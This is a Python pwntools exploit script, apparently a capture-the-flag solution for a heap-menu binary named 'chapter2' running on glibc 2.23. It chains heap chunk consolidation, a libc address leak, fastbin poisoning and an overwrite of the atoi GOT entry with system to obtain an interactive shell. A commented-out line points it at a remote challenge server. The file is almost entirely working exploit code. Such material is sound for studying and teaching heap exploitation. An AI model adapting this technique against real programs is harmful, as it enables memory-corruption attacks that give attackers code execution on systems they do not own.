
from pwn import *

p = process("./chapter2",env={"LD_PRELOAD":"libc-2.23.so"})#libc6_2.23-0ubuntu10_amd64.so"})
#p = remote("206.189.18.188",31615)#"206.189.18.188",30019)
#context.log_level = "debug"
e = ELF("./chapter2")
#libc = ELF("./libc-2.23.so")

def alloc(size, data):
	p.recvrepeat(.5)
	p.sendline(str(1))
	p.recvrepeat(.5)
	p.sendline(str(size))
	p.recvrepeat(.5)
	p.sendline(data.replace('\x7f', '\x16\x7f'))

def edit(index, data):
	p.recvrepeat(.5)
	p.sendline(str(2))
	p.recvrepeat(.5)
	p.sendline(str(index))
	p.recvrepeat(.5)
	p.sendline(data.replace('\x7f', '\x16\x7f'))

def free(index):
	p.recvrepeat(.5)
	p.sendline(str(3))
	p.recvrepeat(.5)
	p.sendline(str(index))

def dump(index):
    p.recvrepeat(.5)
    p.sendline(str(4))
    p.recvrepeat(.5)
    p.sendline(str(index))
ptr = 0x006020c0
wait = raw_input("creating then freeing 4 fastbins")
alloc(0x10,b"A" * 0x10)
alloc(0x10,b"A" * 0x10)
alloc(0x10,b"A" * 0x10)
free(0)
free(1)
free(2)
wait = raw_input("Creating four adjacent chunks")
alloc(0xf8,b"B" * 0xf8)
alloc(0x68,b"C" * 0x68)
alloc(0xf8,b"D" * 0xf8)
alloc(0xf8,b"E" * 0x10)
wait = raw_input("Free first?")
free(0)

wait = raw_input("Edit D with C for backwards consolidation?") 
buf = b'C' *0x60
buf += p64(0x170)
edit(1,buf)
wait = raw_input("Free third chunk?")
free(2)

wait = raw_input("Re-alloc and push libc addresses to second chunk?")
alloc(0xf8,"Y" * 0xf8)

wait = raw_input("Dump second chunk for a libc leak?")
#context.log_level = "debug"
dump(1)
received = p.recvuntil("+--")
#wait = input("received")
#context.log_level = "debug"
leak = u64(received[21:27] + b'\x00\x00')
#leak = u64(received[18:24]+b'\x00\x00')
wait = raw_input("Leaked Libc ADDR: " + hex(leak))
#fake_fast =  0x601fef

#fake_fast = leak - 0x8b
fake_fast = 0x60209d
libc = leak - 0x3c4b78

#onegadget = libc + 0xf1147#0x45216#0xf1147#0xf02a4
oneshot_offset = 0xd5bf7#0x3f42a#0x45216
#oneshot_offset = 0x4526a
#oneshot_offset = 0xf02a4
#oneshot_offset = 0xf1147

onegadget = libc + oneshot_offset#0xf1147#0x45216#0xf1147#0xf02a4
#oneshot_offset = 0x45216
wait = raw_input("Fake Fast: " + hex(fake_fast))
wait = raw_input("fix fastbin size")
free(0)
alloc(0x108,b'X' * 0xf0 + p64(0) + p64(0x70))
wait = raw_input("free first chunk")
free(0)
wait = raw_input("Free second chunk")
free(1)

wait = raw_input("overwrite fastbin fd with big alloc")
alloc(0x108,b'Z' * 0x100 + p64(fake_fast))

wait = raw_input("Fix fastbin again")
free(0)
alloc(0x100,b'X' * 0xf0 + p64(0) + p64(0x70))
wait = raw_input("Allocate a fastbin to get it out of list")
alloc(0x68,b'Z' * 0x68)
wait = raw_input("Overwrite fake_fast_free")
alloc(0x68,b'A' * 0x3 + p64(0xf8) + p64(e.got['atoi'])  + p64(0x6020b0))
wait = raw_input("edit got.atoi to system")
edit(0,p64(libc + 0x45390))
wait = raw_input("gg")
p.interactive()


